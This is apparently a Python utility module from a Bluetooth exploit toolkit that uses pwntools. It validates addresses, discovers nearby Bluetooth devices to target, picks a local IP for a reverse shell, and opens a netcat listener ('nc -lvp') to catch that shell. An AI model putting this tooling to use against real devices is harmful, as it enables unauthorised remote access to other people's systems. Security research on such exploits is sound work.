"""
This module provides utility function for the exploit.
"""

# No direct invocation of this module
if __name__ == "__main__":
    import sys
    sys.exit("This module must not be invoked directly. Invoke exploit.py instead.")

from pwn import log
from shlex import split
from subprocess import Popen, PIPE
import bluetooth
import netifaces as netif
import pick
import re
import socket
import struct

# Regex for bluetooth addresses
TARGET_RE = re.compile("([a-f0-9]{2}:){5}([a-f0-9]{2})", flags=re.IGNORECASE)

def is_valid_bdaddr(input):
    """
    Checks if 'input' is a valid bluetooth address (taking only format into account).

    Params:
        - 'input' - The bluetooth address to check for validity

    Returns:
        'True' if the input is a valid address, 'False' otherwise
    """
    return TARGET_RE.match(input)


def is_valid_ip(input):
    """
    Checks if 'inpout' is a valid IP address by using the socket library.

    Params:
        - 'input' - The address to check for validity

    Returns:
        'True' if the input is a valid address, 'False' otherwise
    """
    try:
        socket.inet_pton(socket.AF_INET, input)
        return True
    except socket.error:
        return False


def exec_command_block(command):
    """
    Executes 'command' and blocks until the command has finished. Returns the
    statuscode and the returned data. The data is stdout if the return code was
    0, otherwise stderr will be returned.

    Params:
        - 'command' - The command to execute

    Returns:
        The return code of the command and its output
    """
    proc = Popen(command, stdout=PIPE, stderr=PIPE)
    out, err = proc.communicate()
    if proc.returncode != 0:
        log.failure("Command failed: %s" % err)
    return proc.returncode, out if proc.returncode == 0 else err


def get_local_dev():
    """
    Gets all local bluetooth devices and asks the user to pick one. Returns
    the name and the local address of the chosen device.

    Returns:
        Name and address of the chosen bluetooth device or 'None' if there is
        no device.
    """
    prog = log.progress("Searching for local bluetooth devices")
    code, out = exec_command_block(["hcitool", "dev"])
    if code != 0:
        return None, None

    out = out.strip().replace("Devices:", "").strip().split("\n")
    if not out or len(out) <= 0 or out[0] == "":
        return None, None
    for i, dev in enumerate(out):
        out[i] = dev.strip().split()

    prog.success("Found %d devices" % (len(out),))
    options = ["%s" % (name) for (name, addr) in out]
    title = "Please choose the local device to use: "
    option, index = pick.pick(options, title)
    return out[index]


def get_target():
    """
    Discovers all nearby detectable bluetooth devices and asks the user to pick
    one of them. Returns the bluetooth address of the chosen device.

    Returns:
        The bluetooth address of the chosen device or 'None' if there is no
        device.
    """
    prog = log.progress("Searching for target devices")
    devs = bluetooth.discover_devices(duration=2, flush_cache=True, lookup_names=True)
    if len(devs) == 0:
        prog.failure("No devices found!")
        return None

    prog.success("Found %d devices" % (len(devs)))
    options = [["%s (%s)" % (name, addr), "%s" % (addr)] for addr, name in devs]
    title = "Please choose the device to target: "
    option, index = pick.pick(options, title, options_map_func=lambda x: x[0])
    return options[index][1]


def get_local_ip():
    """
    Lists all local network interfaces and asks the user for a choice. Returns
    the local ip address of the chosen interface.

    Returns:
        The ip address of the chosen local interface
    """
    interfaces = netif.interfaces()
    options = list()
    for iface in interfaces:
        if str(iface) == "lo":
            continue
        try:
            ip = netif.ifaddresses(iface)[netif.AF_INET][0]["addr"]
        except KeyError:
            continue
        options.append(["%s (%s)" % (ip, iface), "%s" % (ip)])

    if len(options) <= 0:
        log.failure("Did not find any suitable network interfaces for reverse shell!")
        return None

    title = "Please choose the interface/address to use for the reverse shell: "
    option, index = pick.pick(options, title, options_map_func=lambda x: x[0])
    return options[index][1]


def open_listening_shell(port):
    """
    Opens a listening port on 'port' by invoking ncat in an xterm window.

    Params:
        - 'port' - The port to listen on
    """
    log.info("Opening netcat listener for reverse shell...")
    listener = "nc -lvp %s" % (port,)
    Popen(["xterm", "-hold", "-e", listener])


def print_result(result):
    """
    Prints the 'result' of the information leak to stdout.
    """
    i = 0
    for line in result:
      sys.stdout.write("%02d: " % i)
      for x in line:
        sys.stdout.write("%08x " % x)
      else:
        sys.stdout.write("\n")
        i += 1


def _reverse_dict(d):
    """
    Reverses the dictionary 'd' and returns it.

    Params:
        - 'd' - The dictionary to reverse

    Returns:
        The reversed dictionary 'd'
    """
    return dict(map(reversed, d.items()))


def create_struct_funcs(format_, definition):
    struct_format = format_ + ''.join(map(lambda field: field[1], definition))
    keys = list(map(lambda field: field[0], definition))
    mappers = dict(map(lambda field: (field[0], field[2]),
                       filter(lambda field: len(field) > 2, definition)))
    reverse_mappers = dict(map(lambda item: (item[0], _reverse_dict(item[1])),
                               mappers.items()))

    def pack(**kwargs):
        unknown_fields = set(kwargs.keys()) - set(keys)
        missing_fields = set(keys) - set(kwargs.keys())
        if len(unknown_fields) > 0:
            raise TypeError('Unknown field(s): {!r}'.format(unknown_fields))
        if len(missing_fields) > 0:
            raise TypeError('Missing field(s): {!r}'.format(missing_fields))
        for key, mapper in mappers.items():
            kwargs[key] = mapper[kwargs[key]]
        return struct.pack(struct_format, *map(lambda key: kwargs[key], keys))

    def unpack(data):
        result = dict(zip(keys, struct.unpack(struct_format, data)))
        for key, mapper in reverse_mappers.items():
            result[key] = mapper[result[key]]
        return result

    def size():
        return struct.calcsize(struct_format)

    return pack, unpack, size

